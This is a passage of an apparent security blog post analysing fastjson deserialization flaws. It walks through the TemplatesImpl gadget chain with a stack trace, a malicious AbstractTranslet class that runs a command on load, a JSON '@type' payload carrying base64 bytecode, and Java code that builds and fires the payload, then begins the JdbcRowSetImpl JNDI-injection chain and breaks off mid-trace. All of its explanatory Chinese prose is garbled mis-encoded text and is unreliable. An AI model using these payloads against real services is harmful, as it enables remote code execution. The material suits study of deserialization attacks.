</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exec:348, Runtime (java.lang)
</span></span><span style="display:flex;"><span>&lt;clinit&gt;:22, Calculartor (com.reus09)
</span></span><span style="display:flex;"><span>newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:423, Constructor (java.lang.reflect)
</span></span><span style="display:flex;"><span>newInstance:442, Class (java.lang)
</span></span><span style="display:flex;"><span>getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:498, Method (java.lang.reflect)
</span></span><span style="display:flex;"><span>setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:137, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>parse:193, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>main:117, FastJsonTest (com.reus09)
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆæˆ‘ä»¬åœ¨<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>å­˜åœ¨ä¸€ä¸ªæˆå‘˜å±æ€§ <code>_class</code>ï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º<code>_transletIndex</code> çš„ç±»ä¼šåœ¨ <code>getTransletInstance()</code> æ–¹æ³•ä¸­ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163033006.png" alt="image-20221012163033006"  />
</p>
<p>åŒæ—¶æˆ‘ä»¬å‘ç°<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code>ä¸­è°ƒç”¨äº†<code>getTransletInstance()</code></p>
<p>æ–¹æ³•,åŒæ—¶,<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>è°ƒç”¨äº†è¿™é‡Œçš„<code>newTransformer()</code>æ–¹æ³•ã€‚<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163356927.png" alt="image-20221012163356927"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163504021.png" alt="image-20221012163504021"  />
</p>
<p>è¿™é‡Œçš„<code>getOutputProperties()</code>æ–¹æ³•å°±æ˜¯å¯¹<code>TemplatesImpl</code>ç±»çš„ç§æœ‰å…ƒç´ <code>outputProperties</code>çš„<code>getter</code>æ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163737803.png" alt="image-20221012163737803"  />
</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶<code>_class</code>ä»¥åŠ<code>_transletIndex</code>å°±å¯ä»¥å®ç°ä»»æ„ç±»çš„å®ä¾‹åŒ–ï¼Œä»è€Œè§¦å‘æ¼æ´ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012164030137.png" alt="image-20221012164030137"  />
</p>
<p><code>defineTransletClasses()</code>ä¸<code>newInstance()</code>åœ¨åŒä¸€æ–¹æ³•å†…ï¼Œäºæ˜¯æŸ¥çœ‹ä¸€ä¸‹``defineTransletClasses()` çš„é€»è¾‘ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012164449592.png" alt="image-20221012164449592"  />
</p>
<p>å…ˆè¦æ±‚ <code>_bytecodes</code> ä¸ä¸ºç©ºï¼Œæ¥ç€å°±ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„ ClassLoader å»åŠ è½½ <code>_bytecodes</code> ä¸­çš„ <code>byte[]</code> ã€‚è€Œ <code>_bytecodes</code> ä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å±æ€§ã€‚</p>
<p><code>_bytecodes</code>å˜é‡éç©ºå€¼æ—¶ï¼Œç¨‹åºå°†ä¼šæŠŠ<code>_bytecodes</code>æ•°ç»„ä¸­çš„å€¼å¾ªç¯å–å‡ºï¼Œä½¿ç”¨<code>loader.defineClass</code>æ–¹æ³•ä»å­—èŠ‚ç è½¬åŒ–ä¸º<code>Class</code>å¯¹è±¡ï¼Œéšååèµ‹å€¼ç»™<code>_class[i]</code>ã€‚</p>
<p>è€Œå¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º <code>ABSTRACT_TRANSLET</code> ä¹Ÿå°±æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ï¼Œå°±ä¼šå°†ç±»æˆå‘˜å±æ€§çš„ï¼Œ<code>_transletIndex</code> è®¾ç½®ä¸ºå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œè€Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå°±æ˜¯<code>_class[0]</code>ã€‚å¦‚æœçˆ¶ç±»ä¸æ˜¯è¿™ä¸ªç±»ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>é‚£è¿™æ ·ä¸€æ¡å®Œæ•´çš„æ¼æ´è°ƒç”¨é“¾å°±å‘ˆç°å‡ºæ¥äº†ï¼š</p>
<ul>
<li>æ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <code>_bytecodes</code> æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚</li>
<li>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• <code>getOutputProperties()</code>ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼š<code>getOutputProperties()</code> -&gt; <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
</ul>
<p>åŒæ—¶ä¸ºäº†ç¨‹åºåœ¨å®ä¾‹åŒ–ä¹‹å‰å› æŠ¥é”™é€€å‡ºï¼Œéœ€è¦å°†<code>_name</code>å’Œ<code>_tfactory</code>è®¾ç½®ä¸ä¸ºç©ºï¼Œ<code>_tfactory</code>å¦‚æœä¸æŒ‡å®šä¼šå‡ºç°ç©ºæŒ‡é’ˆã€‚æŸ¥çœ‹_tfactoryçš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">transient</span> TransformerFactoryImpl _tfactory = <span style="color:#fff;font-weight:bold">null</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165031307.png" alt=""  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165045973.png" alt="image-20221012165045973"  />
å…·ä½“å®ç°ï¼š</p>
<p>ä¸€ä¸ªç»§æ‰¿äº†<code>AbstractTranslet</code>çš„æ¶æ„ç±»,å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName Calculartor
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/12 15:42
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> Calculartor <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>payload</code>éƒ¨åˆ†ï¼š</p>
<ul>
<li>
<p><code>JSON</code>å¯¹åº”çš„å¦‚ä¸‹:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ä»£ç å¦‚ä¸‹:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class&#34;</span>));
</span></span><span style="display:flex;"><span>String codeString = Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(code);
</span></span><span style="display:flex;"><span>String payload = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;</span>+Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(code)+<span style="color:#0ff;font-weight:bold">&#34;\&#34;],\&#34;_name\&#34;:\&#34;reus09\&#34;,\&#34;_tfactory\&#34;:{ },\&#34;_outputProperties\&#34;:{ },\&#34;_version\&#34;:\&#34;1.0\&#34;,\&#34;allowedProtocols\&#34;:\&#34;all\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>JSON.<span style="color:#007f7f">parse</span>(payload, Feature.<span style="color:#007f7f">SupportNonPublicField</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165442664.png" alt="image-20221012165442664"  />
</p>
</li>
</ul>
<h3 id="jdbcrowsetimpl--ååºåˆ—åŒ–"><code>JdbcRowSetImpl </code> ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#jdbcrowsetimpl--ååºåˆ—åŒ–">#</a></h3>
<p><code>JdbcRowSetImpl </code>ç±»ä½äº <code>com.sun.rowset.JdbcRowSetImpl</code> ï¼Œæ˜¯ <code>javax.naming.InitialContext#lookup()</code> å‚æ•°å¯æ§å¯¼è‡´çš„ JNDI æ³¨å…¥ã€‚</p>
<p><code>JdbcRowSetImpl</code>è°ƒç”¨å‡½æ•°æ ˆ</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exec:348, Runtime (java.lang)
</span></span><span style="display:flex;"><span>&lt;init&gt;:19, badClassName (com.reus09)
</span></span><span style="display:flex;"><span>newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:423, Constructor (java.lang.reflect)
</span></span><span style="display:flex;"><span>newInstance:442, Class (java.lang)
</span></span><span style="display:flex;"><span>getObjectFactoryFromReference:174, NamingManager (javax.naming.spi)
</span></span><span style="display:flex;"><span>getObjectInstance:330, NamingManager (javax.naming.spi)
</span></span><span style="display:flex;"><span>decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
</span></span><span style="display:flex;"><span>lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
</span></span><span style="display:flex;"><span>lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
</span></span><span style="display:flex;"><span>lookup:417, InitialContext (javax.naming)
</span></span><span style="display:flex;"><span>connect:624, JdbcRowSetImpl (com.sun.rowset)
</span></span><span style="display:flex;"><span>setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
